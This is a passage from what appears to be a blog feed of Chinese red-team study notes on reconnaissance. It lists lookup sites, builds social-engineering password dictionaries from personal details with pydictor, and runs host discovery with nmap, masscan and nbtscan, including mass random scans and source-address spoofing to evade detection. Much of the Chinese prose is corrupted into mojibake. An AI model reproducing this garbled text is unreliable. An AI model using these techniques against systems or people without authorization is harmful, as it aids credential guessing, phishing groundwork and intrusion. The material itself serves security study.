è½½è¾ƒæ…¢ï¼Œå¯ä»¥æŸ¥è¯¢è§£æçš„ipå’Œå¼€å¯çš„æœåŠ¡ä»¥åŠæœåŠ¡å™¨çš„åœ°åŸŸ</td></tr><tr><td><a href="https://www.threatcrowd.org/">https://www.threatcrowd.org/</a></td><td>å…³ç³»å›¾ã€whoisä¿¡æ¯ã€dnså†å²è§£æã€å¼€å¯çš„æœåŠ¡ã€å­åŸŸä»¥åŠå¯¹åº”çš„IP</td></tr><tr><td><a href="https://dnslytics.com/">https://dnslytics.com</a></td><td>æ ¹æ®åŸŸåå¯ä»¥æŸ¥è¯¢é¡¶çº§åŸŸä¸åŒçš„åŸŸåï¼Œå¯æŸ¥è¯¢è·¯ç”±ä¿¡æ¯å’Œä¿¡æ¯æä¾›è€…ã€‚æ ¹æ®ipæŸ¥è¯¢å¯ä»¥è¾ƒå…¨çš„whoisä¿¡æ¯å’Œå¼€å¯çš„æœåŠ¡</td></tr><tr><td><a href="https://pentest-tools.com/information-gathering/find-subdomains-of-domain">https://pentest-tools.com/information-gathering/find-subdomains-of-domain</a></td><td>å¯ä»¥æ‰«æå­åŸŸåï¼Œä½†æ˜¯æ¯å¤©åªæœ‰ä¸€æ¬¡å…è´¹çš„æœºä¼šï¼Œè¯¥ç½‘ç«™çš„åœ¨çº¿å·¥å…·éƒ½æ˜¯ä»˜è´¹ä½¿ç”¨</td></tr><tr><td><a href="https://viewdns.info/">https://viewdns.info</a></td><td>æœ‰æŒºå¤šåŠŸèƒ½ï¼ŒåæŸ¥ipã€whoisæŸ¥è¯¢ã€ipå†å²ã€ç«¯å£æ‰«æç­‰ï¼Œä½†æ˜¯åŠ è½½æ…¢</td></tr><tr><td><a href="http://www.yunsee.cn/finger.html">http://www.yunsee.cn/finger.html</a></td><td>éœ€è¦æ³¨å†Œã€é‚€è¯·ç </td></tr><tr><td><a href="https://www.aizhan.com/">https://www.aizhan.com/</a></td><td>å¯ä»¥æŸ¥è¯¢è®¿é—®é‡ã€å­åŸŸç­‰</td></tr><tr><td><a href="https://phpinfo.me/domain">https://phpinfo.me/domain</a></td><td>çˆ†ç ´å­åŸŸå</td></tr></tbody></table><h3 id="ç›¸å…³æ•´åˆå·¥å…·"><a href="#ç›¸å…³æ•´åˆå·¥å…·" class="headerlink" title="ç›¸å…³æ•´åˆå·¥å…·"></a>ç›¸å…³æ•´åˆå·¥å…·</h3><p><a href="https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md">https://github.com/rshipp/awesome-malware-analysis/blob/main/%E6%81%B6%E6%84%8F%E8%BD%AF%E4%BB%B6%E5%88%86%E6%9E%90%E5%A4%A7%E5%90%88%E9%9B%86.md</a></p><p>åœ¨çº¿æ¶æ„è½¯ä»¶åˆ†ææ•´åˆ</p><h3 id="DNSå†å²è§£æè®°å½•"><a href="#DNSå†å²è§£æè®°å½•" class="headerlink" title="DNSå†å²è§£æè®°å½•"></a>DNSå†å²è§£æè®°å½•</h3><p><a href="https://www.dnsdb.io/zh-cn/">https://www.dnsdb.io/zh-cn/</a></p><p><a href="https://viewdns.info/">https://viewdns.info/</a></p><h3 id="ä¿¡æ¯æ”¶é›†åœ¨çº¿å·¥å…·åˆé›†"><a href="#ä¿¡æ¯æ”¶é›†åœ¨çº¿å·¥å…·åˆé›†" class="headerlink" title="ä¿¡æ¯æ”¶é›†åœ¨çº¿å·¥å…·åˆé›†"></a>ä¿¡æ¯æ”¶é›†åœ¨çº¿å·¥å…·åˆé›†</h3><p><a href="https://lovebear.top/info/cn/index.html">https://lovebear.top/info/cn/index.html</a></p>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
            <tag> tools </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>å…³è”ä¿¡æ¯ç”Ÿæˆ</title>
      <link href="/2022/03/25/guan-lian-xin-xi-sheng-cheng/"/>
      <url>/2022/03/25/guan-lian-xin-xi-sheng-cheng/</url>
      
        <content type="html"><![CDATA[<p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»åˆ©ç”¨å·²ç»æ”¶é›†çš„ä¸ªäººä¿¡æ¯æ¥ç”Ÿæˆå­—å…¸ã€‚</p><p>æ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ã€‚</p><h2 id="å…³è”ä¿¡æ¯ç”Ÿæˆ"><a href="#å…³è”ä¿¡æ¯ç”Ÿæˆ" class="headerlink" title="å…³è”ä¿¡æ¯ç”Ÿæˆ"></a>å…³è”ä¿¡æ¯ç”Ÿæˆ</h2><p>åœ¨æ¸—é€å‰æœŸå·¥ä½œå¼€å±•ä¹‹å‰ï¼Œéœ€è¦å¯¹ç›®æ ‡çš„å„ç§ä¿¡æ¯è¿›è¡Œåˆ†æã€æ‹†åˆ†ã€ç»„åˆã€‚</p><p>ä¾‹å¦‚ï¼šèµ«å°”å·´æ–¯äºšåŸºå›½</p><p>æ ¹æ®åœ°åŸŸä¹ æƒ¯ã€å®—æ•™ã€äº’è”ç½‘å¼€å‘ä¿¡æ¯ç­‰ä¿¡æ¯è¿›è¡Œç®€è¦æ‹†åˆ†ï¼Œå‡è®¾è·å–çš„ä¿¡æ¯å¦‚ä¸‹ï¼š</p><ul><li>å½“åœ°äººçˆ±å¥½åƒæ©™å­</li><li>å½“åœ°äººä¿¡å¥‰ä¼Šæ–¯å…°æ•™</li><li>IPV4åœ°å€å¼€æ”¾IPæ®µ</li><li>ç›¸å…³ç¤¾äº¤ç½‘ç»œå…¬å¼€çš„æ•°æ®åº“</li></ul><p>æ ¹æ®å®—æ•™ã€ä¹ æƒ¯ã€IPåœ°å€ã€å¼€æ”¾æ•°æ®æ”¯æŒâ€¦â€¦ç­‰ï¼Œä¸ºåç»­çš„å­—å…¸ç”Ÿæˆã€é±¼å‰ã€æ°´å‘æ”»å‡»é“ºä¸‹åŸºçŸ³ã€‚</p><h2 id="å­—å…¸ç”Ÿæˆ"><a href="#å­—å…¸ç”Ÿæˆ" class="headerlink" title="å­—å…¸ç”Ÿæˆ"></a>å­—å…¸ç”Ÿæˆ</h2><h3 id="pydictor"><a href="#pydictor" class="headerlink" title="pydictor"></a>pydictor</h3><h4 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">git</span> clone https://github.com/LandGrey/pydictor.git<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h4 id="ç”Ÿæˆå­—å…¸"><a href="#ç”Ÿæˆå­—å…¸" class="headerlink" title="ç”Ÿæˆå­—å…¸"></a>ç”Ÿæˆå­—å…¸</h4><p><img src="https://img1.imgtp.com/2022/03/25/Xb0E9vMT.png"></p><p>å¿«é€Ÿä½¿ç”¨ï¼š<a href="https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md">https://github.com/LandGrey/pydictor/blob/master/docs/doc/usage.md</a></p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token variable">$python3</span> pydictor.py --sedb                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __             <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>             <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>             <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>             <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                                            Social Engineering Dictionary Builder                                            Build by LandGrey    ----------------------------<span class="token punctuation">[</span> <span class="token builtin class-name">command</span> <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>help desc             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>exit/quit            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>clear/cls    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>show option           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>set option arguments <span class="token punctuation">[</span>+<span class="token punctuation">]</span>rm option    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>len minlen maxlen     <span class="token punctuation">[</span>+<span class="token punctuation">]</span>head prefix          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>tail suffix    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>encode <span class="token builtin class-name">type</span>           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>occur L d s          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>types L d s    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>regex string          <span class="token punctuation">[</span>+<span class="token punctuation">]</span>level code           <span class="token punctuation">[</span>+<span class="token punctuation">]</span>leet code    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>output directory      <span class="token punctuation">[</span>+<span class="token punctuation">]</span>run    ----------------------------<span class="token punctuation">[</span> option <span class="token punctuation">]</span>----------------------------    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>cname                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>ename                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>sname    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>birth                 <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedpwd              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>phone    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>uphone                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>hphone               <span class="token punctuation">[</span>+<span class="token punctuation">]</span>email    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>postcode              <span class="token punctuation">[</span>+<span class="token punctuation">]</span>nickname             <span class="token punctuation">[</span>+<span class="token punctuation">]</span>idcard    <span class="token punctuation">[</span>+<span class="token punctuation">]</span>jobnum                <span class="token punctuation">[</span>+<span class="token punctuation">]</span>otherdate            <span class="token punctuation">[</span>+<span class="token punctuation">]</span>usedcharpydictor SEDB<span class="token operator">>></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>æ–°ç‰ˆpydictorç”Ÿæˆå­—å…¸æ—¶å­˜åœ¨é—®é¢˜ï¼Œéœ€è¦ä¸‹è½½æ—§ç‰ˆpydictor</p><p>wget <a href="https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip">https://github.com/LandGrey/pydictor/archive/refs/tags/v2.0.5.zip</a></p></blockquote><h4 id="åˆå¹¶å»é‡"><a href="#åˆå¹¶å»é‡" class="headerlink" title="åˆå¹¶å»é‡"></a>åˆå¹¶å»é‡</h4><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">python pydictor.py -tool unqbiner /my/all/dict/<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><blockquote><p>åªéœ€è¦æŒ‡å®šè·¯å¾„</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~/tools/pydictor-2.0.5<span class="token punctuation">]</span>â””â”€$ python3 pydictor.py -tool uniqbiner ~/tools/pydictor-2.0.5/results/                              _ _      _              _ __  _   _  __<span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> ___<span class="token operator">|</span> <span class="token operator">|</span>_ ___  _ __                                               <span class="token operator">|</span> <span class="token string">'_ \| | | |/ _` | |/ __| __/ _ \| '</span>__<span class="token operator">|</span>                                              <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>_<span class="token operator">|</span> <span class="token operator">|</span> <span class="token operator">|</span> <span class="token punctuation">(</span>__<span class="token operator">|</span> <span class="token operator">||</span> <span class="token punctuation">(</span>_<span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token operator">|</span>                                                 <span class="token operator">|</span> .__/ <span class="token punctuation">\</span>__, <span class="token operator">|</span><span class="token punctuation">\</span>__,_<span class="token operator">|</span>_<span class="token operator">|</span><span class="token punctuation">\</span>___<span class="token operator">|</span><span class="token punctuation">\</span>__<span class="token punctuation">\</span>___/<span class="token operator">|</span>_<span class="token operator">|</span>                                                 <span class="token operator">|</span>_<span class="token operator">|</span>    <span class="token operator">|</span>___/                            <span class="token number">2.0</span>.5<span class="token comment">#dev                        </span><span class="token punctuation">[</span>+<span class="token punctuation">]</span> Source of  :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> A total of :7869 lines<span class="token punctuation">[</span>+<span class="token punctuation">]</span> Store <span class="token keyword">in</span>   :/home/kali/tools/pydictor-2.0.5/results/uniqbiner_034233.txt <span class="token punctuation">[</span>+<span class="token punctuation">]</span> Cost       :0.2306 seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>]]></content>
      
      
      <categories>
          
          <category> redteam </category>
          
      </categories>
      
      
        <tags>
            
            <tag> redteam </tag>
            
            <tag> ä¿¡æ¯æ”¶é›† </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ä¸»æœºå‘ç°</title>
      <link href="/2022/03/24/zhu-ji-fa-xian/"/>
      <url>/2022/03/24/zhu-ji-fa-xian/</url>
      
        <content type="html"><![CDATA[<p>å¼€ä¸€ä¸ªæ–°å‘ï¼Œå°†å¸‚é¢ä¸Šç°åœ¨æµä¼ çš„ redteam ç³»åˆ—ä¹¦ç±è¿›è¡Œä¸€ä¸ªå­¦ä¹ è®°å½•ï¼Œæ–‡ç« å†…å®¹ä¸»è¦æ‘˜è‡ªæŸçº¢é˜Ÿç³»åˆ—ä¸›ä¹¦ã€‚</p><p>æœ¬ç« èŠ‚å†…å®¹ä¸»è¦æ˜¯ä»‹ç»å¸¸è§çš„ä¸»æœºæ‰«æå’ŒæœåŠ¡æ‰«æå·¥å…·ã€‚</p><h2 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h2><h3 id="å®˜ç½‘"><a href="#å®˜ç½‘" class="headerlink" title="å®˜ç½‘"></a>å®˜ç½‘</h3><p><a href="https://nmap.org/">https://nmap.org/</a></p><h3 id="å®‰è£…"><a href="#å®‰è£…" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">Mac osï¼šbrew <span class="token function">install</span> nmapCentosï¼šyum <span class="token function">install</span> nmapUbuntuï¼šapt <span class="token function">install</span> nmap<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><h3 id="å‚è€ƒæ‰‹å†Œ"><a href="#å‚è€ƒæ‰‹å†Œ" class="headerlink" title="å‚è€ƒæ‰‹å†Œ"></a>å‚è€ƒæ‰‹å†Œ</h3><p><a href="https://nmap.org/man/zh/index.html">https://nmap.org/man/zh/index.html</a></p><h3 id="æ‰«ææ–¹å¼"><a href="#æ‰«ææ–¹å¼" class="headerlink" title="æ‰«ææ–¹å¼"></a>æ‰«ææ–¹å¼</h3><ul><li>TCPï¼š-sT</li><li>SYNï¼š-sS</li><li>ACKï¼š-sA</li><li>UDPï¼š-sU</li><li>RPCï¼š-sR</li><li>ICMPï¼š-sP</li><li>Disable Port Scanï¼š-sn</li></ul><h3 id="å¸¸ç”¨çš„æ‰«ææ–¹æ³•"><a href="#å¸¸ç”¨çš„æ‰«ææ–¹æ³•" class="headerlink" title="å¸¸ç”¨çš„æ‰«ææ–¹æ³•"></a>å¸¸ç”¨çš„æ‰«ææ–¹æ³•</h3><ul><li>æ‰«æ10000ç«¯å£ã€æ“ä½œç³»ç»Ÿã€ç‰ˆæœ¬</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -T4 -A <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>ç‰ˆæœ¬æ¢æµ‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -sV <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><ul><li>æ“ä½œç³»ç»Ÿæ¢æµ‹</li></ul><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">nmap -O <span class="token operator">&lt;</span>target<span class="token operator">></span><span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="å…¶ä»–æŠ€å·§"><a href="#å…¶ä»–æŠ€å·§" class="headerlink" title="å…¶ä»–æŠ€å·§"></a>å…¶ä»–æŠ€å·§</h3><ul><li>â€“host-timeout ä¸»æœºè¶…æ—¶ é€šå¸¸é€‰å€¼ï¼š18000</li><li>â€“scan-delay æŠ¥æ–‡æ—¶é—´é—´éš” é€šå¸¸é€‰å€¼ï¼š1000</li><li>-S &lt;æºåœ°å€&gt; å®šä¹‰æ‰«ææºåœ°å€ï¼Œä¸ºäº†ä¸è¢«å‘ç°</li></ul><h3 id="ç¤ºä¾‹"><a href="#ç¤ºä¾‹" class="headerlink" title="ç¤ºä¾‹"></a>ç¤ºä¾‹</h3><p>nmap -v -iR 100000 -P0 -p 80</p><p><code>éšæœºé€‰æ‹©100000å°ä¸»æœºæ‰«ææ˜¯å¦è¿è¡ŒWebæœåŠ¡å™¨ï¼ˆ80ç«¯å£ï¼‰ã€‚ç”±èµ·å§‹é˜¶æ®µå‘é€æ¢æµ‹æŠ¥æ–‡æ¥ç¡®å®šä¸»æœºæ˜¯å¦å·¥ä½œéå¸¸æµªè´¹æ—¶é—´ï¼Œè€Œä¸”åªéœ€æ¢æµ‹ä¸»æœºçš„ä¸€ä¸ªç«¯å£ï¼Œå› æ­¤ä½¿ç”¨ -P0 ç¦æ­¢å¯¹ä¸»æœºåˆ—è¡¨ã€‚ï¼ˆ-P0 å°±æ˜¯ -Pnï¼‰</code></p><p>host company.com | cut -d â€˜ â€˜ -f 4 | nmap -v -iL -ï¼ˆhost -l company.com | cut -d â€˜ â€˜ -f 4 | nmap -v -iL -ï¼‰</p><p><code>è¿›è¡ŒDNSåŒºåŸŸä¼ è¾“ï¼Œå·²å‘ç°company.comä¸­çš„ä¸»æœºï¼Œç„¶åå°†IPåœ°å€æä¾›ç»™nmap</code></p><blockquote><p>host -l &lt;domain&gt; éœ€è¦æœ‰åŸŸç³»ç»Ÿçš„<strong>ç®¡ç†å‘˜æƒé™</strong>ï¼Œæ‰å¯ä»¥åˆ—å‡ºæ‰€æœ‰å­åŸŸåï¼Œä¸€èˆ¬æƒ…å†µä¸‹æ— æ³•ä½¿ç”¨<br>cut -d â€˜ â€˜ -f 4 å°†è¾“å‡ºç»ˆç«¯çš„å­—ç¬¦è¿›è¡Œåˆ†å‰²ï¼Œ-d æŒ‡å®šåˆ†å‰²å­—ç¬¦ï¼ŒæŒ‡å®šåˆ†å‰²ä½ç½®<br>nmap -v -iL - è§£æå‡ºæ¥ ip ä¼ ç»™ nmap æ‰«æï¼Œ-v æ˜¾ç¤ºè¯¦ç»†ä¿¡æ¯ï¼Œ-iL æŒ‡å®šä¼ å…¥çš„æ–‡ä»¶å</p></blockquote><h3 id="è¾“å‡º"><a href="#è¾“å‡º" class="headerlink" title="è¾“å‡º"></a>è¾“å‡º</h3><ul><li><p>-oN <File></p></li><li><p>-oX <XML File></p></li><li><p>-oG <filespec></p><p>Grepè¾“å‡º å‚è€ƒï¼š<a href="http://www.unspecific.com/nmap-oG-output">http://www.unspecific.com/nmap-oG-output</a></p></li></ul><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap -O -oG - www.baidu.com  Nmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:16:08 <span class="token number">2022</span> as: nmap -O -oG - www.baidu.comHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Ports: <span class="token number">80</span>/open/tcp//http///, <span class="token number">443</span>/open/tcp//https///     Ignored State: filtered <span class="token punctuation">(</span><span class="token number">998</span><span class="token punctuation">)</span>Seq Index: <span class="token number">256</span>   IP ID Seq: RandomizedNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:16:21 <span class="token number">2022</span> -- <span class="token number">1</span> IP address <span class="token punctuation">(</span><span class="token number">1</span> <span class="token function">host</span> up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">12.63</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap www.baidu.com -oG - <span class="token operator">|</span> <span class="token function">awk</span> <span class="token string">'/open/&#123;print $2&#125;'</span><span class="token number">110.242</span>.68.3<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><blockquote><p>awk â€˜/open/{print $2}â€™ æ­£åˆ™åŒ¹é…å« open çš„è¡Œï¼Œä»¥ç©ºæ ¼ä¸ºåˆ†å‰²å–ç¬¬äºŒåˆ—</p></blockquote><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">$ <span class="token function">sudo</span> nmap <span class="token number">110.242</span>.68.4/29 -oG - -sPNmap <span class="token number">7.92</span> scan initiated Thu Mar <span class="token number">24</span> 06:28:33 <span class="token number">2022</span> as: nmap -oG - -sP <span class="token number">110.242</span>.68.4/29Host: <span class="token number">110.242</span>.68.1 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.2 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.3 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.4 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.5 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.6 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpHost: <span class="token number">110.242</span>.68.7 <span class="token punctuation">(</span><span class="token punctuation">)</span>   Status: UpNmap <span class="token keyword">done</span> at Thu Mar <span class="token number">24</span> 06:28:47 <span class="token number">2022</span> -- <span class="token number">8</span> IP addresses <span class="token punctuation">(</span><span class="token number">7</span> hosts up<span class="token punctuation">)</span> scanned <span class="token keyword">in</span> <span class="token number">14.25</span> seconds<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h2 id="masscan"><a href="#masscan" class="headerlink" title="masscan"></a>masscan</h2><h3 id="é¡¹ç›®åœ°å€"><a href="#é¡¹ç›®åœ°å€" class="headerlink" title="é¡¹ç›®åœ°å€"></a>é¡¹ç›®åœ°å€</h3><p><a href="https://github.com/robertdavidgraham/masscan">https://github.com/robertdavidgraham/masscan</a></p><h3 id="å®‰è£…-1"><a href="#å®‰è£…-1" class="headerlink" title="å®‰è£…"></a>å®‰è£…</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> <span class="token function">apt-get</span> --assume-yes <span class="token function">install</span> <span class="token function">git</span> <span class="token function">make</span> gcc<span class="token function">git</span> clone https://github.com/robertdavidgraham/masscan<span class="token builtin class-name">cd</span> masscan<span class="token function">make</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><blockquote><p>è¯¥å·¥å…·å…¼å®¹Nmapçš„å‚æ•°</p></blockquote><p>ç°åœ¨å¯ä»¥ç›´æ¥aptå®‰è£…</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">apt</span> <span class="token function">install</span> masscan<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><h3 id="é«˜çº§é€‰é¡¹"><a href="#é«˜çº§é€‰é¡¹" class="headerlink" title="é«˜çº§é€‰é¡¹"></a>é«˜çº§é€‰é¡¹</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell"><span class="token function">sudo</span> masscan <span class="token number">121.37</span>.71.222 --port <span class="token number">3389</span> --adapter-ip <span class="token number">192.168</span>.186.26<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://img1.imgtp.com/2022/03/24/RmpdiIk8.png"></p><ul><li>â€“adapter-ip æŒ‡å®šå‘åŒ…çš„IPåœ°å€</li><li>â€“adapter-port æŒ‡å®šå‘åŒ…çš„æºç«¯å£</li><li>â€“adapter-mac æŒ‡å®šå‘åŒ…çš„æºMACåœ°å€</li><li>â€“router-mac æŒ‡å®šç½‘å…³çš„MACåœ°å€</li><li>â€“exclude IPåœ°å€èŒƒå›´é»‘åå•ï¼Œé˜²æ­¢masscanæ‰«æ</li><li>â€“includefileï¼Œ-iL è¯»å–ä¸€ä¸ªèŒƒå›´åˆ—è¡¨è¿›è¡Œæ‰«æ</li><li>â€“wait æŒ‡å®šç½‘å‘é€åŒ…åçš„ç­‰å¾…æ—¶é—´ï¼Œé»˜è®¤ä¸º10ç§’</li></ul><h2 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h2><p>kaliä¸­å·²ç»å®‰è£…ï¼š</p><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ <span class="token function">whereis</span> nbtscannbtscan: /usr/bin/nbtscan /usr/share/man/man1/nbtscan.1.gz                                                                                                              â”Œâ”€â”€<span class="token punctuation">(</span>kaliã‰¿kali<span class="token punctuation">)</span>-<span class="token punctuation">[</span>~<span class="token punctuation">]</span>â””â”€$ nbtscanNBTscan version <span class="token number">1.7</span>.1.This is a <span class="token function">free</span> software and it comes with absolutely no warranty.You can use, distribute and modify it under terms of GNU GPL <span class="token number">2</span>+.Usage:nbtscan <span class="token punctuation">[</span>-v<span class="token punctuation">]</span> <span class="token punctuation">[</span>-d<span class="token punctuation">]</span> <span class="token punctuation">[</span>-e<span class="token punctuation">]</span> <span class="token punctuation">[</span>-l<span class="token punctuation">]</span> <span class="token punctuation">[</span>-t timeout<span class="token punctuation">]</span> <span class="token punctuation">[</span>-b bandwidth<span class="token punctuation">]</span> <span class="token punctuation">[</span>-r<span class="token punctuation">]</span> <span class="token punctuation">[</span>-q<span class="token punctuation">]</span> <span class="token punctuation">[</span>-s separator<span class="token punctuation">]</span> <span class="token punctuation">[</span>-m retransmits<span class="token punctuation">]</span> <span class="token punctuation">(</span>-f filename<span class="token punctuation">)</span><span class="token operator">|</span><span class="token punctuation">(</span><span class="token operator">&lt;</span>scan_range<span class="token operator">></span><span class="token punctuation">)</span> <span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="nbtscanç¤ºä¾‹"><a href="#nbtscanç¤ºä¾‹" class="headerlink" title="nbtscanç¤ºä¾‹"></a>nbtscanç¤ºä¾‹</h3><pre class="line-numbers language-shell" data-language="shell"><code class="language-shell">nbtscan -r <span class="token number">192.168</span>.0.1/24æ‰«ææ•´ä¸ªCæ®µnbtscan <span class="token number">192.168</span>.0.1-100æ‰«æä¸€ä¸ªèŒƒå›´nbtscan -v -s <span class="token builtin class-name">:</span> <span class="token number">192.168</span>.0.0/24ä»¥ <span class="token builtin class-name">:</span> åˆ†å‰²æ˜¾ç¤ºç»“æœnbtscan -f <span class="token operator">&lt;</span>File<span class="token operator">></span>ä»æ–‡ä»¶è¯»å–æ‰«æèŒƒå›´<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h3 id="é«˜çº§ç”¨æ³•"><a href="#é«˜çº§ç”¨æ³•" class="headerlink" title="é«˜çº§ç”¨æ³•"></a>é«˜çº§ç”¨æ³•</h3><pre class="line-numbers language-shell" data-language="shell"><code 